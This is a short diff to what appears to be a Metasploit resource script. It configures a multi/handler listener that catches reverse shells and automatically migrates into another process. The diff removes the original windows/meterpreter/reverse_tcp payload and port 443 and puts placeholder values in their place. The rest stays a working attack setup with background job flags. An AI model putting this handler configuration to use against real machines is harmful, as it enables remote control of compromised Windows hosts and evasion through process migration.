@@ -1,7 +1,7 @@
 use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST #
-set LPORT 443
+set PAYLOAD aaa
+set LHOST bbb
+set LPORT ccc
 set ExitOnSession false
 set InitialAutoRunScript migrate -f
 
@@ -10,4 +10,3 @@ set InitialAutoRunScript migrate -f
 </ruby>
 
 exploit -j -z
-
